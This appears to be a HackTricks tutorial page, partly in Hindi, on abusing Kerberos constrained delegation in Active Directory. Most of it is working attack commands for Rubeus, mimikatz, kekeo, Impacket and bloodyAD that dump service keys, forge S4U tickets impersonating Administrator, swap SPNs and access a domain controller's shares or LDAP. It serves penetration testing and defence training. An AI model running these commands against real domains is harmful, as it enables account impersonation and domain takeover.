# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against any **service** of a machine.

- **Service for User to self (_S4U2self_):** यदि एक **service account** का _userAccountControl_ मान [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) शामिल करता है, तो वह किसी भी अन्य उपयोगकर्ता की ओर से अपने लिए (सेवा) TGS प्राप्त कर सकता है।
- **Service for User to Proxy(_S4U2proxy_):** एक **service account** किसी भी उपयोगकर्ता की ओर से उस सेवा के लिए TGS प्राप्त कर सकता है जो **msDS-AllowedToDelegateTo** में सेट है। ऐसा करने के लिए, उसे पहले उस उपयोगकर्ता की ओर से अपने लिए एक TGS चाहिए होता है, लेकिन वह पहले दूसरे TGS का अनुरोध करने से पहले S4U2self का उपयोग करके वह TGS प्राप्त कर सकता है।

**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_ ’ in AD, you will **not be able to impersonate** them.

This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to any **service** over the indicated machines (possible **privesc**).

Moreover, you **won't only have access to the service that the user is able to impersonate, but also to any service** क्योंकि SPN (the service name requested) की जांच नहीं की जाती (ticket में यह हिस्सा encrypted/signed नहीं होता)। इसलिए, यदि आपके पास **CIFS service** तक पहुंच है तो आप उदाहरण के लिए Rubeus में `/altservice` फ्लैग का उपयोग करके **HOST service** तक भी पहुंच हासिल कर सकते हैं। यही SPN swapping कमजोरी **Impacket getST -altservice** और अन्य टूलिंग द्वारा भी दुरुपयोग की जाती है।

Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation नोट्स (2025+)

**Windows Server 2012/2012 R2** से KDC S4U2Proxy extensions के माध्यम से **constrained delegation across domains/forests** का समर्थन करता है। Modern builds (Windows Server 2016–2025) यह व्यवहार बनाए रखते हैं और protocol transition संकेत करने के लिए दो PAC SIDs जोड़ते हैं:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) when the user authenticated normally.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) when a service asserted the identity through protocol transition.

अगर protocol transition का उपयोग domains के पार किया जाता है, तो PAC के अंदर `SERVICE_ASSERTED_IDENTITY` की उम्मीद करें, जो पुष्टि करता है कि S4U2Proxy चरण सफल रहा।

### Impacket / Linux उपकरण (altservice & full S4U)

हाल की Impacket (0.11.x+) Rubeus के समान S4U chain और SPN swapping उजागर करती है:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
If you prefer forging the user ST first (e.g., offline hash only), pair **ticketer.py** with **getST.py** for S4U2Proxy. See the open Impacket issue #1713 for current quirks (KRB_AP_ERR_MODIFIED when the forged ST doesn't match the SPN key).

### low-priv creds से delegation सेटअप को ऑटोमेट करना

यदि आपके पास पहले से किसी कंप्यूटर या सर्विस अकाउंट पर **GenericAll/WriteDACL** अधिकार हैं, तो आप आवश्यक attributes को RSAT के बिना रिमोटली **bloodyAD** (2024+) का उपयोग करके पुश कर सकते हैं:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
यह आपको उन ऐट्रिब्यूट्स को लिख सकने पर DA privileges के बिना privesc के लिए constrained delegation path बनाने देता है।

- चरण 1: **अनुमत सेवा का TGT प्राप्त करें**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> कंप्यूटर में SYSTEM न होते हुए भी **TGT ticket प्राप्त करने के अन्य तरीके** या **RC4** या **AES256** प्राप्त करने के अन्य तरीके मौजूद हैं, जैसे Printer Bug और unconstrain delegation, NTLM relaying और Active Directory Certificate Service का दुरुपयोग
>
> **केवल उस TGT ticket (or hashed) के पास होने से आप बिना पूरे कंप्यूटर को समझौता किए इस हमले को अंजाम दे सकते हैं।**

- Step2: **उपयोगकर्ता की नक़ल करके service के लिए TGS प्राप्त करें**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) और [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## संदर्भ
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
